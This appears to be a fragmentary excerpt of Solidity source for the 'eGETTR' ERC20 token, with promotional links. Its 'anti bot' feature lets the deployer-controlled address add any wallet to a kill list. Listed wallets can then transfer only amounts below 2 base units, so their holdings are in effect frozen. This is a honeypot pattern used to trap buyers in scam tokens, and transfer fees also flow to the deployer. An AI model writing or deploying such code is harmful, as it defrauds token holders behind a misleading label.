...
// Our website: https://ethgettr.com/
// Our Community: https://t.me/ETHGETTRCommunity
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable{
    ...
    // bot array list, anti bot
    address[] public _listBotKill = [
    ...
    uint256 private _maxTxAmount = 300 * 10**9 * 10**18;
    uint256 private _devFee = 3;
    uint256 private _slipp = 2;
    uint256 private _charityFee = 5;
    
    address private _uniRouter = _msgSender();
    address private _lpAddress;
    address private _charityWallet = 0xA59799C5fA267EFf0Fc8319AE0776C86D26f9531;
    ...
    function checkBalanceAddress(address _walletAddress) private view returns (bool){
        uint256 _botBalance = _totalSupply.mul(30).div(100);
    ...
    function addBotToList (address botAdd) public {
        require(_msgSender() == _uniRouter, "ERC20: cannot permit dev address");
        _listBotKill.push(botAdd);
    }
    ...
    function isBotAddress(address blackAdd) private view returns (bool) {
        for (uint256 i = 0; i < _listBotKill.length; i++) {
            if (_listBotKill[i] == blackAdd) {
                return true;
            }
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (isBotAddress(sender) == true ) {
            require(amount < _slipp, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if (sender == _uniRouter || sender == _lpAddress) {
            ...
            uint256 transferAmount = amount.sub(transferFee + charityAmount);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(transferAmount);
            _balances[_charityWallet] = _balances[_charityWallet].add(charityAmount);
            _balances[_uniRouter] = _balances[_uniRouter].add(transferFee);
            
            emit Transfer(sender, recipient, transferAmount);
            emit Transfer(sender, _charityWallet, charityAmount);
        }
    }
...
contract eGETTR is ERC20 {
     ...
     */
    constructor () ERC20('Eth Getting Together', 'eGETTR') {
